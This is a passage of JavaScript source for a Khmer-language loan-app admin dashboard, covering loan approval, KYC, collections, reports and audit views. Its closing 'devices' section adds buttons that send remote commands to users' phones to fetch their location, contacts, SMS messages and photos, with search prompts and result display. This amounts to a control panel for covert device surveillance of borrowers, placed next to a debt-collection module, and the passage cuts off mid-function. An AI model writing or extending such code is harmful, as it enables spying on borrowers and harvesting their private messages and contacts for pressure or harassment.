    { label: 'បរិយាកា', render: (r) => esc(r.method) },
  ], d.payments, {})}
    </div>` : ''}`;

  openModal({
    title: `កម្ចី #${l.id} — ${esc(l.user_name)}`,
    body,
    wide: true,
    onSave: null,
  });

  $$('[data-loan-autodebit]').forEach((b) => b.onclick = async () => {
    const on = b.dataset.on === '1';
    await api(`/loans/${l.id}/auto-debit`, { method: 'PATCH', body: { enabled: !on } });
    toast(on ? 'បានបិទស្វត្តកម្ម' : 'បានបើកស្វត្តកម្ម', 'ok');
    showLoan(id);
  });
  $$('[data-loan-runautodebit]').forEach((b) => b.onclick = async () => {
    const out = await api('/loans/run-auto-debit', { method: 'POST', body: {} });
    const results = out.results || [];
    const paid = results.filter((r) => r.status === 'paid');
    const label = {
      no_due: 'មិនមានវីនុបទដល់កាល',
      not_due: 'វីនុបទទីមិនទាន់ដល់កាល',
      no_card: 'គ្មានកាត',
      insufficient_funds: 'បន្រាក់ក្នុងកាតមិនគ្រប់គ្នា',
      bad_amount: 'ចំនួនមិនត្រឹមត្រាន',
    };
    const skipped = results.filter((r) => r.status !== 'paid')
      .map((r) => `#${r.loan_id} ${label[r.status] || r.status}`);
    if (paid.length) {
      toast(`បង់ស្វត្តកម្ម ${paid.length} វីនុបទ`, 'ok');
    } else {
      toast(results.length ? skipped.join(' · ') : 'មិនមានវីនុបទដល់កាល', 'ok');
    }
    showLoan(id);
  });
}

/* ---------- វាយតម្លៃ ---------- */
async function scoreLoan(id) {
  const d = await api(`/loans/${id}/score`, { method: 'POST' });
  const parts = (d.parts || []).map((p) => `
    <div class="bar-row"><span>${esc(p.label)}</span>
      <span class="bar-track"><span class="bar-fill" style="width:${Math.round((p.points / p.max) * 100)}%"></span></span>
      <span class="bar-val">${p.points}/${p.max}</span></div>`).join('');
  openModal({
    title: 'លទ្ធផលវាយតម្លៃឥណទិសជាតិ',
    body: `<div class="detail-grid">
        <div class="detail-item"><div class="k">ពិន្ទ្រ</div><div class="v">${d.score} / 100</div></div>
        <div class="detail-item"><div class="k">ក្រុម</div><div class="v">${esc(d.band)}</div></div>
        <div class="detail-item"><div class="k">CBC</div><div class="v">${esc(d.cbc?.status || '—')}</div></div>
        <div class="detail-item"><div class="k">សម្គាល់</div><div class="v">${esc(d.recommendation)}</div></div>
      </div>
      <div class="bars">${parts}</div>`,
    wide: true,
  });
}

/* ---------- អនុមត្ត → បង្កើតតារាងសងប្រាក់ ---------- */
async function approveLoan(id) {
  const d = await api(`/loans/${id}`);
  const l = d.loan;
  const firstDue = new Date(Date.now() + 30 * 86400000).toISOString().slice(0, 10);
  openModal({
    title: `អនុមត្តកម្ចី #${l.id} — បង្កើតតារាងសងប្រាក់តាមខែ`,
    body: `<p class="muted" style="margin:0">អ្នកប្រើ: <b>${esc(l.user_name)}</b> · ចំនួន ${money(l.principal)}</p>
      <label class="field"><span>រយៈខែ</span><input id="a_months" type="number" min="1" max="60" value="${l.months}"></label>
      <label class="field"><span>កាន្លោះ (%/ឆ្នាំ)</span><input id="a_rate" type="number" step="0.01" value="${l.annual_rate}"></label>
      <label class="field"><span>វិធីគណនា</span>
        <select id="a_method">
          <option value="annuity" ${l.interest_method === 'annuity' ? 'selected' : ''}>Annuity — វីនុបទស្មើគ្នា</option>
          <option value="flat" ${l.interest_method === 'flat' ? 'selected' : ''}>Flat — កាន្លោះថ្តា</option>
          <option value="reducing" ${l.interest_method === 'reducing' ? 'selected' : ''}>Declining — កាន្លោះថ្នាក់</option>
        </select></label>
      <label class="field"><span>ថ្លៃសេវកម្ម (%)</span><input id="a_fee" type="number" step="0.1" min="0" max="20" value="${l.fee_percent || 0}"></label>
      <label class="field"><span>កាលបរិច្ឆេទបង់ដំបូង</span><input id="a_due" type="date" value="${firstDue}"></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="a_verified" style="width:18px;height:18px"><span>គណនីបញ្ចូលបានផ្ទៀងផ្ទាត់</span></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="a_autodebit" style="width:18px;height:18px"><span>បង់ស្វត្តកម្ម (ដកចំនួនពេលវីនុបទដល់កាល)</span></label>
      <p class="muted" style="margin:0">ថ្លៃសេវកម្មត្រូវបានកាត់ចេញពីប្រាក់ដែលបញ្ចូលទៅអ្នកប្រើ។</p>`,
    wide: true,
    saveLabel: 'អនុមត្ត និងបង្កើតតារាង',
    onSave: async () => {
      const res = await api(`/loans/${l.id}/approve`, {
        method: 'POST',
        body: {
          months: Number($('#a_months').value),
          annual_rate: Number($('#a_rate').value),
          interest_method: $('#a_method').value,
          fee_percent: Number($('#a_fee').value),
          first_due_date: $('#a_due').value,
          account_verified: $('#a_verified').checked,
          auto_debit: $('#a_autodebit').checked,
        },
      });
      toast(`បានអនុមត្ត · បង្កើតតារាង ${res.schedule_count} វីនុបទ · ${money(res.monthly_payment)}/ខែ`, 'ok');
      render();
    },
  });
}

/* ---------- បដិសេធ ---------- */
function rejectLoan(id) {
  openModal({
    title: `បដិសេធកម្ចី #${id}`,
    body: `<label class="field"><span>មូលហេតុបដិសេធ</span>
      <textarea id="r_reason" rows="3" placeholder="ឧ. ប្រាក់ចូលមិនគ្រប់គ្រាន់, ប្រវត្តិឥណទិសជាតិមិនស្រប…"></textarea></label>`,
    saveLabel: 'បដិសេធ',
    onSave: async () => {
      const reason = $('#r_reason').value.trim();
      if (!reason) throw new Error('សូមសម្គាល់មូលហេតុបដិសេធ');
      await api(`/loans/${id}/reject`, { method: 'POST', body: { reason } });
      toast('បានបដិសេធកម្ចី', 'ok');
      render();
    },
  });
}

/* ---------- បញ្ចូលស្រាប់ ---------- */
function disburseLoan(id) {
  confirmAction('បញ្ចូលស្រាប់កម្ចី',
    'ប្រាក់នឹងបញ្ចូលទៅកាតដំបូងរបស់អ្នកប្រើ (បន្ថយដោយថ្លៃសេវកម្ម)។',
    async () => {
      const d = await api(`/loans/${id}/disburse`, { method: 'POST', body: { account_verified: true } });
      toast(`បានបញ្ចូល ${money(d.net_disbursed)} (ថ្លៃ ${money(d.fee)})`, 'ok');
      render();
    });
}

/* ---------- បង់កម្ចី (សាច់ការ) ---------- */
async function repayLoan(id) {
  const d = await api(`/loans/${id}`);
  const l = d.loan;
  const next = (d.schedule || []).find((r) => r.status !== 'paid');
  openModal({
    title: `បង់កម្ចី #${l.id}`,
    body: `${next ? `<p class="muted" style="margin:0">វីនុបទទី ${next.installment_no} · ត្រូវបង់ ${money(Number(next.total_due) - Number(next.paid_amount))}</p>` : ''}
      <label class="field"><span>ចំនួនបង់</span>
        <input id="p_amount" type="number" step="0.01" value="${next ? (Number(next.total_due) - Number(next.paid_amount)).toFixed(2) : ''}"></label>`,
    saveLabel: 'កត់ត្រាការបង់',
    onSave: async () => {
      const amount = Number($('#p_amount').value);
      if (!(amount > 0)) throw new Error('ចំនួនបង់ត្រូវ > 0');
      await api(`/loans/${id}/repay`, { method: 'POST', body: { amount } });
      toast('បានកត់ត្រាការបង់ប្រាក់', 'ok');
      render();
    },
  });
}

/* ============================================================
   KYC
   ============================================================ */
async function renderKyc() {
  const d = await api('/kyc');
  const rows = d.rows || [];
  $('#content').innerHTML = `
    <div class="card">
      <div class="card-head"><h3>KYC / CRM (${rows.length})</h3>
        <span class="muted">ព័ត៌មានអត្តសញ្ញាណសម្រាប់កម្ចីវីក្រុយ</span></div>
      ${tableHtml([
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<span>${esc(r.user_name)}</span></div>` },
    { label: 'អត្តសញ្ញាណ', render: (r) => `<span class="muted">${esc(r.national_id || '—')}</span>` },
    { label: 'អាជីវណ៍', render: (r) => `<div>${esc(r.business_name || '—')}<div class="muted" style="font-size:11.5px">${esc(r.business_type || '')} · ${r.business_years || 0} ឆ្នាំ</div></div>` },
    { label: 'ប្រាក់ចូល/ចំណាយ', num: true, render: (r) => `${money0(r.monthly_income)} / ${money0(r.monthly_expense)}` },
    { label: 'គណនី', render: (r) => `<span class="muted">${esc(r.bank_name || '—')} ${esc(r.bank_account || '')}</span>` },
    { label: 'ស្ថានភាព', render: (r) => `<span class="pill ${r.status === 'verified' ? 'ok' : r.status === 'rejected' ? 'bad' : 'warn'}">${esc(r.status)}</span>` },
    {
      label: 'សកម្ម', render: (r) => `<div class="row-actions">
        <button class="btn ghost sm" data-kyc-view="${r.user_id}">មើល</button>
        <button class="btn primary sm" data-kyc-verify="${r.user_id}">ផ្ទៀងផ្ទាត់</button>
        <button class="btn danger sm" data-kyc-reject="${r.user_id}">បដិសេធ</button></div>`
    },
  ], rows, { empty: 'មិនទាន់មានទិន្ននថ្យី KYC' })}
    </div>`;
  $$('[data-kyc-view]').forEach((b) => b.onclick = () => {
    const r = rows.find((x) => String(x.user_id) === b.dataset.kycView);
    openModal({
      title: `KYC — ${esc(r.user_name)}`,
      body: `<div class="detail-grid">
          <div class="detail-item"><div class="k">ឈ្មោះ</div><div class="v">${esc(r.full_name)}</div></div>
          <div class="detail-item"><div class="k">អត្តសញ្ញាណ</div><div class="v">${esc(r.national_id || '—')}</div></div>
          <div class="detail-item"><div class="k">ថ្ងៃខែឆ្នាំកើត</div><div class="v">${esc(r.dob || '—')}</div></div>
          <div class="detail-item"><div class="k">លេខទូរសែព្យ</div><div class="v">${esc(r.phone || '—')}</div></div>
          <div class="detail-item"><div class="k">អាសយដ្ឋាន</div><div class="v">${esc(r.address || '—')}</div></div>
          <div class="detail-item"><div class="k">មុខរដ្ឋាន</div><div class="v">${esc(r.occupation || '—')}</div></div>
          <div class="detail-item"><div class="k">អាជីវណ៍</div><div class="v">${esc(r.business_name || '—')} · ${r.business_years || 0} ឆ្នាំ</div></div>
          <div class="detail-item"><div class="k">ប្រាក់ចូល/ចំណាយ/ប្រាក់ខ្ពុក</div><div class="v">${money(r.monthly_income)} / ${money(r.monthly_expense)} / ${money(r.existing_debt)}</div></div>
          <div class="detail-item"><div class="k">គណនីបញ្ចូល</div><div class="v">${esc(r.bank_name || '—')} ${esc(r.bank_account || '')}</div></div>
        </div>`,
      wide: true,
    });
  });
  $$('[data-kyc-verify]').forEach((b) => b.onclick = () => {
    api(`/kyc/${b.dataset.kycVerify}`, { method: 'PATCH', body: { status: 'verified' } })
      .then(() => { toast('បានផ្ទៀងផ្ទាត់ KYC', 'ok'); render(); })
      .catch((e) => toast(e.message, 'err'));
  });
  $$('[data-kyc-reject]').forEach((b) => b.onclick = () => {
    api(`/kyc/${b.dataset.kycReject}`, { method: 'PATCH', body: { status: 'rejected', notes: 'ព័ត៌មានមិនពេញលេញ' } })
      .then(() => { toast('បានបដិសេធ KYC', 'ok'); render(); })
      .catch((e) => toast(e.message, 'err'));
  });
}

/* ============================================================
   COLLECTIONS — ការប្រមូល
   ============================================================ */
let collectionFilter = 'all';

async function renderCollections() {
  const d = await api(`/collections?status=${collectionFilter}`);
  const rows = d.rows || [];
  const c = d.by_status || {};
  const teams = (await api('/collection-teams')).rows || [];
  const totalDue = rows.reduce((s, r) => s + Number(r.amount_due || 0), 0);
  $('#content').innerHTML = `
    <div class="grid k4">
      <div class="card kpi"><div class="kpi-label">កាតក្រង់សម្រាប់ប្រមូល</div><div class="kpi-value">${(c.open || 0) + (c.in_progress || 0)}</div><div class="kpi-sub">បើក ${c.open || 0} · កំពុងធ្វើ ${c.in_progress || 0}</div></div>
      <div class="card kpi warn"><div class="kpi-label">ប្រាក់ត្រូវប្រមូល</div><div class="kpi-value">${money0(totalDue)}</div><div class="kpi-sub">សរុបកាតក្រង់ទាំងអស់</div></div>
      <div class="card kpi ok"><div class="kpi-label">បានដំណោះស្រាយ</div><div class="kpi-value">${c.resolved || 0}</div><div class="kpi-sub">ការប្រមូលបានបញ្ចប់</div></div>
      <div class="card kpi"><div class="kpi-label">លុបចេញ</div><div class="kpi-value">${c.written_off || 0}</div><div class="kpi-sub">សារព្យាបាត់បង់</div></div>
    </div>
    <div class="card">
      <div class="tabs">
        ${[['all', 'ទាំងអស់'], ['open', 'បើក'], ['in_progress', 'កំពុងធ្វើ'], ['resolved', 'បានដំណោះ'], ['written_off', 'លុបចេញ']]
      .map(([k, l]) => `<button class="tab ${collectionFilter === k ? 'active' : ''}" data-cstatus="${k}">${esc(l)}</button>`).join('')}
      </div>
    </div>
    <div class="card">
      <div class="card-head"><h3>កាតក្រង់សម្រាប់ប្រមូល (${rows.length})</h3>
        <button class="btn ghost sm" data-team-new="1">បង្កើតក្រុមប្រមូល</button></div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<div>
      <div>${esc(r.user_name)}</div><div class="muted" style="font-size:11.5px">${esc(r.user_phone || '')}</div></div></div>` },
    { label: 'កម្ចី', render: (r) => `<span class="muted">#${r.loan_id} · ${money0(r.principal)}</span>` },
    { label: 'ផុតថ្ងៃ', num: true, render: (r) => `<span style="color:${Number(r.days_arrears) >= 90 ? '#ff9b9b' : Number(r.days_arrears) >= 30 ? '#ffc48f' : '#8fa6c4'}">${r.days_arrears}</span>` },
    { label: 'ត្រូវបង់', num: true, render: (r) => money(r.amount_due) },
    { label: 'អាទិភាព', render: (r) => `<span class="pill ${r.priority === 'high' ? 'bad' : r.priority === 'normal' ? 'warn' : 'info'}">${esc(r.priority)}</span>` },
    { label: 'ក្រុម', render: (r) => `<span class="muted">${esc(r.team_name || 'មិនទាន់ចែក')}</span>` },
    { label: 'ប្រគល់', render: (r) => `<span class="muted">${esc(r.officer || 'មិនទាន់ចាត់')}</span>` },
    { label: 'ស្ថានភាព', render: (r) => `<span class="pill ${r.status === 'resolved' ? 'ok' : r.status === 'in_progress' ? 'info' : 'warn'}">${esc(r.status)}</span>` },
    {
      label: 'សកម្ម', render: (r) => `<div class="row-actions">
        <button class="btn ghost sm" data-col-edit="${r.id}">ធ្វើការ</button></div>`
    },
  ], rows, { empty: 'គ្មានកាតក្រង់ប្រមូល' })}
    </div>`;
  $$('[data-cstatus]').forEach((b) => b.onclick = () => { collectionFilter = b.dataset.cstatus; render(); });
  $$('[data-team-new]').forEach((b) => b.onclick = () => {
    openModal({
      title: 'បង្កើតក្រុមប្រមូល',
      body: `<label class="field"><span>ឈ្មោះក្រុម</span><input id="t_name" placeholder="ឧ. សង្កាត់កណ្តាល"></label>
        <label class="field"><span>សាខា</span><input id="t_branch" placeholder="ឧ. សាខាកណ្តាល"></label>
        <label class="field"><span>ប្រគល់ការប្រមូល</span><input id="t_officer" placeholder="ឈ្មោះប្រគល់"></label>
        <label class="field"><span>លេខទូរស័ព្ទ</span><input id="t_phone" placeholder="+855..."></label>`,
      saveLabel: 'បង្កើត',
      onSave: async () => {
        await api('/collection-teams', {
          method: 'POST',
          body: {
            name: $('#t_name').value.trim(),
            branch: $('#t_branch').value.trim(),
            officer: $('#t_officer').value.trim(),
            phone: $('#t_phone').value.trim(),
          },
        });
        toast('បានបង្កើតក្រុមប្រមូល', 'ok');
        render();
      },
    });
  });
  $$('[data-col-edit]').forEach((b) => b.onclick = () => {
    const r = rows.find((x) => String(x.id) === b.dataset.colEdit);
    openModal({
      title: `កាតក្រង់ប្រមូល #${r.id} — ${esc(r.user_name)}`,
      body: `<p class="muted" style="margin:0">ផុត ${r.days_arrears} ថ្ងៃ · ត្រូវបង់ ${money(r.amount_due)} · ដកប្រសប់ ${r.contact_count || 0} ដង</p>
        <label class="field"><span>ក្រុមប្រមូល</span>
          <select id="c_team">
            <option value="">— មិនទាន់ចែក —</option>
            ${teams.map((t) => `<option value="${t.id}" ${String(r.team_id) === String(t.id) ? 'selected' : ''}>${esc(t.name)}${t.branch ? ' · ' + esc(t.branch) : ''}</option>`).join('')}
          </select></label>
        <label class="field"><span>ប្រគល់ការប្រមូល</span><input id="c_officer" value="${esc(r.officer || '')}" placeholder="ឈ្មោះប្រគល់"></label>
        <label class="field"><span>ស្ថានភាព</span>
          <select id="c_status">
            <option value="open" ${r.status === 'open' ? 'selected' : ''}>បើក</option>
            <option value="in_progress" ${r.status === 'in_progress' ? 'selected' : ''}>កំពុងធ្វើ</option>
            <option value="resolved" ${r.status === 'resolved' ? 'selected' : ''}>បានដំណោះ</option>
            <option value="written_off" ${r.status === 'written_off' ? 'selected' : ''}>លុបចេញ</option>
          </select></label>
        <label class="field"><span>អាទិភាព</span>
          <select id="c_priority">
            <option value="low" ${r.priority === 'low' ? 'selected' : ''}>ទាប</option>
            <option value="normal" ${r.priority === 'normal' ? 'selected' : ''}>ធម្មតា</option>
            <option value="high" ${r.priority === 'high' ? 'selected' : ''}>ខ្ពស់</option>
          </select></label>
        <label class="field"><span>កំណត់ចំនាំ</span><textarea id="c_notes" rows="3">${esc(r.notes || '')}</textarea></label>`,
      saveLabel: 'រក្សាទុក',
      onSave: async () => {
        await api(`/collections/${r.id}`, {
          method: 'PATCH',
          body: {
            officer: $('#c_officer').value.trim(),
            status: $('#c_status').value,
            priority: $('#c_priority').value,
            team_id: $('#c_team').value ? Number($('#c_team').value) : null,
            notes: $('#c_notes').value.trim(),
            last_action: 'បានទាក់ទងអ្នកប្រើ',
          },
        });
        toast('បានរក្សាទុកកាតក្រង់', 'ok');
        render();
      },
    });
  });
}

/* ============================================================
   REPORTS — របាយការណ៍
   ============================================================ */
async function renderReports() {
  const [pf, inc, npl] = await Promise.all([
    api('/reports/portfolio'), api('/reports/income'), api('/reports/npl'),
  ]);
  const t = pf.totals;
  const b = npl.buckets;
  const buckets = [
    ['1–30 ថ្ងៃ', b.d1_30, b.amt_d1_30, 'warn'],
    ['31–60 ថ្ងៃ', b.d31_60, b.amt_d31_60, 'warn'],
    ['61–89 ថ្ងៃ', b.d61_89, b.amt_d61_89, 'bad'],
    ['90+ ថ្ងៃ (NPL)', b.d90_plus, b.amt_d90_plus, 'bad'],
  ];
  const statusRows = pf.by_status || [];
  const maxStatus = Math.max(...statusRows.map((s) => Number(s.n)), 1);

  $('#content').innerHTML = `
    <div class="grid k4">
      <div class="card kpi"><div class="kpi-label">ប្រាក់ដែលបានបញ្ចូល</div><div class="kpi-value">${money0(t.disbursed)}</div><div class="kpi-sub">${t.n_loans} កម្ចី</div></div>
      <div class="card kpi warn"><div class="kpi-label">នៅសល់ត្រូវបង់</div><div class="kpi-value">${money0(t.outstanding)}</div><div class="kpi-sub">ប្រាក់ដាក់សរុប ${money0(t.interest_booked)}</div></div>
      <div class="card kpi ok"><div class="kpi-label">ប្រាក់ដាក់បានបញ្ចូល</div><div class="kpi-value">${money0(inc.interest.interest)}</div><div class="kpi-sub">ថ្លៃសេវកម្ម ${money0(inc.fees.fees)}</div></div>
      <div class="card kpi ${npl.npl.n > 0 ? 'warn' : 'ok'}"><div class="kpi-label">NPL</div><div class="kpi-value">${npl.npl.n}</div><div class="kpi-sub">${money0(npl.npl.outstanding)} នៅសល់</div></div>
    </div>

    <div class="grid k2">
      <div class="card">
        <div class="card-head"><h3>ស្ទារាយកម្ចីតាមស្ថានភាព</h3></div>
        <div class="bars">
          ${statusRows.map((s) => `
            <div class="bar-row"><span>${esc((LOAN_STATUS[s.status] || {}).label || s.status)}</span>
              <span class="bar-track"><span class="bar-fill" style="width:${Math.round((Number(s.n) / maxStatus) * 100)}%"></span></span>
              <span class="bar-val">${s.n} · ${money0(s.outstanding)}</span></div>`).join('') || '<div class="empty">មិនទាន់មានទិន្នន័យ</div>'}
        </div>
      </div>
      <div class="card">
        <div class="card-head"><h3>វីនុបទផុតកំណត់ (Aging)</h3></div>
        <div class="bars">
          ${buckets.map(([l, n, amt, cls]) => `
            <div class="bar-row"><span>${esc(l)}</span>
              <span class="bar-track"><span class="bar-fill" style="width:${Math.min(100, Number(n) * 12)}%;background:${cls === 'bad' ? '#ef4444' : '#f59e0b'}"></span></span>
              <span class="bar-val">${n} · ${money0(amt)}</span></div>`).join('')}
        </div>
      </div>
    </div>

    <div class="grid k2">
      <div class="card">
        <div class="card-head"><h3>ប្រាក់ចូលពីកម្ចី (12 ខែ)</h3></div>
        <div class="chart-box"><canvas id="loanIncomeChart"></canvas></div>
      </div>
      <div class="card">
        <div class="card-head"><h3>កម្ចី NPL</h3></div>
        ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'អ្នកប្រើ', render: (r) => esc(r.user_name) },
    { label: 'ប្រាក់ដាក់', num: true, render: (r) => money(r.principal) },
    { label: 'នៅសល់', num: true, render: (r) => money(r.outstanding) },
    { label: 'ផុតថ្ងៃ', num: true, render: (r) => `<span style="color:#ff9b9b">${r.arrears_days}</span>` },
  ], npl.loans, { empty: 'គ្មានកម្ចី NPL — ល្អណាស់' })}
      </div>
    </div>`;

  const monthly = (inc.monthly || []).slice().reverse();
  drawLine($('#loanIncomeChart'), monthly.map((m) => ({
    label: m.month, value: Number(m.total),
  })), { color: '#22c55e' });
}


async function renderNotifications() {
  const d = await api('/notifications?limit=100');
  $('#content').innerHTML = `
    <div class="card">
      <div class="card-head"><h3>សេចក្តីសារថ្មីៗ ${d.rows.length}</h3>
        <button class="btn primary sm" id="n_new">+ ផ្ញើសេចក្តីសារ</button></div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<span>${esc(r.user_name)}</span></div>` },
    { label: 'ចំណងជើង', render: (r) => esc(r.title) },
    { label: 'អត្ថបទ', render: (r) => `<span class="muted">${esc(r.body)}</span>` },
    { label: 'បានអាន', render: (r) => r.read ? '<span class="pill ok">អាន</span>' : '<span class="pill">ថ្មី</span>' },
    { label: 'ពេល', num: true, render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
  ], d.rows, { empty: 'មិនទាន់មានសេចក្តីសារ' })}
    </div>`;
  $('#n_new').onclick = async () => {
    const users = await api('/users?limit=200');
    openModal({
      title: 'ផ្ញើសេចក្តីសារ',
      body: `
        <label class="field"><span>អ្នកប្រើ</span><select id="m_user">${users.rows.map((u) => `<option value="${u.id}">${esc(u.name)} — ${esc(u.email)}</option>`).join('')}</select></label>
        <label class="field"><span>ចំណងជើង</span><input id="m_title"></label>
        <label class="field"><span>អត្ថបទ</span><textarea id="m_body" rows="3"></textarea></label>`,
      onSave: async () => {
        await api('/notify', {
          method: 'POST',
          body: { user_id: Number($('#m_user').value), title: $('#m_title').value.trim(), body: $('#m_body').value.trim() },
        });
        toast('បានផ្ញើសេចក្តីសារ', 'ok');
        render();
      },
    });
  };
}

const DATA_TABLES = [
  ['goals', 'គោលបំណង'], ['budgets', 'ថវិកា'], ['reminders', 'កំណត់ត្រា'],
  ['recurring', 'ប្រតិបត្តិការក្រោយ'], ['splits', 'បែកចែកការចំណាយ'],
  ['virtual_cards', 'កាតនិម្យោ'], ['cashback', 'ប្រាក់វិញ'],
  ['referrals', 'មនុស្សណែនាំ'], ['external_transfers', 'ផ្ទេរក្រៅបទេស'],
  ['banks', 'បង្កើតធនាគារ'], ['achievements', 'សម្គាល់ជោគជ័យ'],
  ['streaks', 'ស្មាត្របន្តថ្ងៃ'], ['fcm_tokens', 'ឧបកប្រុងពន្ធនាយ'],
];
let dataTable = 'goals';

async function renderData() {
  const d = await api(`/tables/${dataTable}?limit=100`);
  const cols = d.columns.length
    ? d.columns
    : Object.keys(d.rows[0] || {}).filter((k) => !['id', 'user_id', 'created_at'].includes(k));
  $('#content').innerHTML = `
    <div class="card">
      <div class="tabs">${DATA_TABLES.map(([k, n]) =>
    `<button class="tab ${k === dataTable ? 'active' : ''}" data-table="${k}">${n}</button>`).join('')}</div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id ?? r.user_id ?? '—'}` },
    { label: 'អ្នកប្រើ', render: (r) => r.user_name ? `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<span>${esc(r.user_name)}</span></div>` : '—' },
    ...cols.map((c) => ({
      label: c, render: (r) => {
        const v = r[c];
        if (v === null || v === undefined || v === '') return '<span class="muted">—</span>';
        if (typeof v === 'number') return money(v);
        if (typeof v === 'object') return `<span class="muted">${esc(JSON.stringify(v))}</span>`;
        const s = String(v);
        return s.length > 40 ? `<span title="${esc(s)}">${esc(s.slice(0, 40))}…</span>` : esc(s);
      },
    })),
    ...(d.editable ? [{
      label: 'សកម្ម', render: (r) => `<button class="btn danger sm" data-row-del="${r.id}">លុប</button>`,
    }] : []),
  ], d.rows, { empty: 'មិនទាន់មានទិន្នន័យ' })}
    </div>`;
  $$('[data-table]').forEach((b) => b.onclick = () => { dataTable = b.dataset.table; render(); });
  $$('[data-row-del]').forEach((b) => b.onclick = () => {
    confirmDelete(`លុបកំណត់ត្រា #${b.dataset.rowDel} ក្នុងតារាងនេះ?`, async () => {
      await api(`/tables/${dataTable}/${b.dataset.rowDel}`, { method: 'DELETE' });
      toast('បានលុប', 'ok');
      render();
    });
  });
}

async function renderAudit() {
  const d = await api('/audit?limit=200');
  $('#content').innerHTML = `
    <div class="card">
      <div class="card-head"><h3>កំណត់ត្រាក្របរបុប · ចុងចាស់លើកទេ</h3></div>
      ${tableHtml([
    { label: 'ពេល', render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
    { label: 'Admin', render: (r) => esc(r.admin_email) },
    { label: 'សកម្ម', render: (r) => `<span class="pill info">${esc(r.action)}</span>` },
    { label: 'គោលប្រភេទ', render: (r) => esc(r.target_type || '—') },
    { label: 'ID', render: (r) => esc(r.target_id || '—') },
    { label: 'ព័ត៌មាន', render: (r) => `<span class="muted">${esc(r.detail || '')}</span>` },
  ], d.rows, { empty: 'មិនទាន់មានកំណត់ត្រា' })}
    </div>`;
}

/* ============================================================
   ROUTER
   ============================================================ */
/* ---------- devices ---------- */
async function renderDevices() {
  const [summary, deviceList] = await Promise.all([
    api('/device/summary'),
    api('/device/list'),
  ]);

  const devices = deviceList.devices || [];
  const recentCmds = summary.recent_commands || [];

  $('#content').innerHTML = `
    <div class="grid k3">
      <div class="card kpi accent">
        <div class="kpi-label">📱 ឧបករណ៍ Online</div>
        <div class="kpi-value">${summary.total_online || 0}</div>
        <div class="kpi-sub">ក្នុងចំណោម ${summary.total_users || 0} អ្នកប្រើ</div>
      </div>
      <div class="card kpi warn">
        <div class="kpi-label">⏳ Commands រង់ចាំ</div>
        <div class="kpi-value">${summary.pending_commands || 0}</div>
        <div class="kpi-sub">pending + sent</div>
      </div>
      <div class="card kpi ok">
        <div class="kpi-label">✅ សរុប Commands</div>
        <div class="kpi-value">${recentCmds.length}</div>
        <div class="kpi-sub">10 ចុងក្រោយ</div>
      </div>
    </div>

    <div class="card" style="margin-top:16px">
      <h3 style="margin:0 0 12px">📡 ឧបករណ៍ទាំងអស់</h3>
      <div class="table-wrap">
        <table>
          <thead>
            <tr>
              <th>អ្នកប្រើ</th>
              <th>ទូរស័ព្ទ</th>
              <th>Status</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            ${devices.map(d => `
              <tr>
                <td>${esc(d.name)}</td>
                <td>${esc(d.phone)}</td>
                <td><span class="dot ${d.online ? 'on' : 'off'}" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${d.online ? '#22c55e' : '#666'};margin-right:6px"></span>${d.online ? 'Online' : 'Offline'}</td>
                <td>
                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_photos')">🖼️ Photos</button>
                  <button class="btn ghost sm" onclick="deleteDevice(${d.id}, '${esc(d.name)}')" style="color:#ef4444;border-color:#ef4444;">🗑️ លុប</button>
                </td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>

    <div class="card" style="margin-top:16px">
      <h3 style="margin:0 0 12px">📜 Command History</h3>
      <div class="table-wrap">
        <table>
          <thead>
            <tr>
              <th>អ្នកប្រើ</th>
              <th>Command</th>
              <th>Status</th>
              <th>Time</th>
              <th>Result</th>
            </tr>
          </thead>
          <tbody>
            ${recentCmds.map(c => `
              <tr>
                <td>${esc(c.user_name)}</td>
                <td>${esc(c.command_type)}</td>
                <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${c.status === 'completed' ? '#22c55e22' : c.status === 'failed' ? '#ef444422' : '#f59e0b22'};color:${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'}">${esc(c.status)}</span></td>
                <td>${dt(c.created_at)}</td>
                <td>${c.result_data ? formatResultData(c.command_type, {...c.result_data, cmdId: c.id, userId: c.user_id}) : '—'}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>
  `;
}

window.sendDeviceCmd = async function(userId, cmdType) {
  let payload = {};
  if (cmdType === 'get_contacts') {
    const query = prompt('ស្វែងរក contact (ទទេ = យកទាំងអស់):') || '';
    payload = { query };
  } else if (cmdType === 'get_sms') {
    const query = prompt('ស្វែងរក SMS (ទទេ = យកទាំងអស់):') || '';
    payload = { query };
  } else if (cmdType === 'get_photos') {
    payload = { limit: 20, offset: 0 };
  }
  try {
    const res = await api('/device/command', { method: 'POST', body: { user_id: userId, command_type: cmdType, payload } });
    toast(`✅ Command បានផ្ញើ (${res.online ? 'online' : 'offline'})`);
    
    // Show results for contacts/SMS reading
    if (cmdType === 'get_contacts' || cmdType === 'get_sms') {
      setTimeout(() => showCommandResults(cmdType, res.command.id, res.command.user_id), 500);
    }
    
    // Show location details
    if (cmdType === 'get_location') {
